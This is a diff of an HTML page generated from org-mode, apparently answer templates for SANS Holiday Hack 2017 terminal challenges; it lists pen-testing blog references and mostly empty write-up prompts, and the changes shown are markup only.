+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="org2f92fc4"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-5-3-1-4" name="sec-5-3-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="org24da2e4"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-5-3-1-5" name="sec-5-3-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -1533,8 +1503,8 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="orga846eb7"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-3-1-6" name="sec-5-3-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found.
 </p>
@@ -1545,24 +1515,24 @@ AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="orgdffe92b"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-3-1-7" name="sec-5-3-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org0cac1ba"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-3-1-8" name="sec-5-3-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="org5872142"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-3-1-9" name="sec-5-3-1-9"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
@@ -1570,28 +1540,25 @@ system?
 </div>
 </li>
 
-<li><a id="loot"></a><a id="org910b03a"></a>Loot<br />
-<div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-3-1-10" name="sec-5-3-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+
 <p>
 Anything interesting hidden on the system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org16b135d" class="outline-3">
-<h3 id="org16b135d">Oh Wait Maybe We Are</h3>
-<div class="outline-text-3" id="text-org16b135d">
-</div>
-<div id="outline-container-org2651ba1" class="outline-4">
-<h4 id="answer-template"><a id="org2651ba1"></a>Answer Template</h4>
+<div id="outline-container-sec-5-4" class="outline-3">
+<h3 id="sec-5-4">Oh Wait Maybe We Are</h3>
+<div class="outline-text-3" id="text-5-4">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-5-4-1" name="sec-5-4-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="org5b6cb79"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-4-1-1" name="sec-5-4-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <pre class="example">
             --&gt;*&lt;--
               /o\
@@ -1619,16 +1586,16 @@ Hint: What commands can you run with sudo?
 </div>
 </li>
 
-<li><a id="how-to-find-the-terminal"></a><a id="orga6203d5"></a>How to find the terminal<br />
-<div class="outline-text-5" id="text-how-to-find-the-terminal">
+<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-4-1-2" name="sec-5-4-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
+
 <p>
 Where was the terminal? What's the direct link to it?
 </p>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="org6653f36"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-5-4-1-3" name="sec-5-4-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this terminal already?
 </p>
@@ -1654,42 +1621,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="orgc318f26"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-5-4-1-4" name="sec-5-4-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="org6a8426e"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-5-4-1-5" name="sec-5-4-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -1697,8 +1672,8 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="orgf766d4c"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-4-1-6" name="sec-5-4-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found.
 </p>
@@ -1709,24 +1684,24 @@ AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org5a197a4"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-4-1-7" name="sec-5-4-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org6bbba41"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-4-1-8" name="sec-5-4-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="org7fce289"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-4-1-9" name="sec-5-4-1-9"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
@@ -1734,30 +1709,26 @@ system?
 </div>
 </li>
 
-<li><a id="loot"></a><a id="orgfd4273f"></a>Loot<br />
-<div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-4-1-10" name="sec-5-4-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+
 <p>
 Anything interesting hidden on the system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-orgf22753e" class="outline-3">
-<h3 id="orgf22753e">There's No Place Like Home</h3>
-<div class="outline-text-3" id="text-orgf22753e">
-</div>
-<div id="outline-container-org67fcc20" class="outline-4">
-<h4 id="answer-template"><a id="org67fcc20"></a>Answer Template</h4>
+<div id="outline-container-sec-5-5" class="outline-3">
+<h3 id="sec-5-5">There's No Place Like Home</h3>
+<div class="outline-text-3" id="text-5-5">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-5-5-1" name="sec-5-5-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="org427ed23"></a>Question<br />
-<div class="outline-text-5" id="text-question">
-<pre class="example">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-5-1-1" name="sec-5-5-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
 
+<pre class="example">
                              ______
                           .-"""".._'.       _,##
                    _..__ |.-"""-.|  |   _,##'`-._
@@ -1781,16 +1752,16 @@ If you can get it running again, I will reward you with a gift of delight.
 </div>
 </li>
 
-<li><a id="how-to-find-the-terminal"></a><a id="org10e2ba1"></a>How to find the terminal<br />
-<div class="outline-text-5" id="text-how-to-find-the-terminal">
+<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-5-1-2" name="sec-5-5-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
+
 <p>
 Where was the terminal? What's the direct link to it?
 </p>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="orga27a211"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-5-5-1-3" name="sec-5-5-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this terminal already?
 </p>
@@ -1816,42 +1787,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="orgd374ff8"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-5-5-1-4" name="sec-5-5-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="org664c27c"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-5-5-1-5" name="sec-5-5-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -1859,8 +1838,8 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="org576e1bf"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-5-1-6" name="sec-5-5-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found.
 </p>
@@ -1871,24 +1850,24 @@ AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="orgb45fa96"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-5-1-7" name="sec-5-5-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org5710694"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-5-1-8" name="sec-5-5-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="org6e1d856"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-5-1-9" name="sec-5-5-1-9"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
@@ -1896,30 +1875,26 @@ system?
 </div>
 </li>
 
-<li><a id="loot"></a><a id="org4356d81"></a>Loot<br />
-<div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-5-1-10" name="sec-5-5-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+
 <p>
 Anything interesting hidden on the system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org401e86b" class="outline-3">
-<h3 id="org401e86b">We're Off To See The</h3>
-<div class="outline-text-3" id="text-org401e86b">
-</div>
-<div id="outline-container-org6b7a9d7" class="outline-4">
-<h4 id="answer-template"><a id="org6b7a9d7"></a>Answer Template</h4>
+<div id="outline-container-sec-5-6" class="outline-3">
+<h3 id="sec-5-6">We're Off To See The</h3>
+<div class="outline-text-3" id="text-5-6">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-5-6-1" name="sec-5-6-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="org60a6090"></a>Question<br />
-<div class="outline-text-5" id="text-question">
-<pre class="example">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-6-1-1" name="sec-5-6-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
 
+<pre class="example">
                  .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
                _(_      _Y_      _Y_      _Y_      _Y_      _)_
               [___]    [___]    [___]    [___]    [___]    [___]
@@ -1938,16 +1913,16 @@ You will need to write your own code, but only a line or two.
 </div>
 </li>
 
-<li><a id="how-to-find-the-terminal"></a><a id="org871d812"></a>How to find the terminal<br />
-<div class="outline-text-5" id="text-how-to-find-the-terminal">
+<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-6-1-2" name="sec-5-6-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
+
 <p>
 Where was the terminal? What's the direct link to it?
 </p>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="org9471c64"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-5-6-1-3" name="sec-5-6-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this terminal already?
 </p>
@@ -1973,42 +1948,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="org7c2f431"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-5-6-1-4" name="sec-5-6-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="org30f6662"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-5-6-1-5" name="sec-5-6-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -2016,8 +1999,8 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="org5f9ed91"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-6-1-6" name="sec-5-6-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found.
 </p>
@@ -2028,24 +2011,24 @@ AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org3a3240e"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-6-1-7" name="sec-5-6-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org5762599"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-6-1-8" name="sec-5-6-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="orgc107591"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-6-1-9" name="sec-5-6-1-9"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
@@ -2053,28 +2036,25 @@ system?
 </div>
 </li>
 
-<li><a id="loot"></a><a id="org3439f61"></a>Loot<br />
-<div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-6-1-10" name="sec-5-6-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+
 <p>
 Anything interesting hidden on the system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org704bdc4" class="outline-3">
-<h3 id="org704bdc4">Winconceivable The Cliffs Of Insanity</h3>
-<div class="outline-text-3" id="text-org704bdc4">
-</div>
-<div id="outline-container-org7806f1e" class="outline-4">
-<h4 id="answer-template"><a id="org7806f1e"></a>Answer Template</h4>
+<div id="outline-container-sec-5-7" class="outline-3">
+<h3 id="sec-5-7">Winconceivable The Cliffs Of Insanity</h3>
+<div class="outline-text-3" id="text-5-7">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-5-7-1" name="sec-5-7-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="org851f9c4"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-7-1-1" name="sec-5-7-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <pre class="example">
                 ___,@
                /  &lt;
@@ -2104,16 +2084,16 @@ Kill the "santaslittlehelperd" process to complete this challenge.
 </div>
 </li>
 
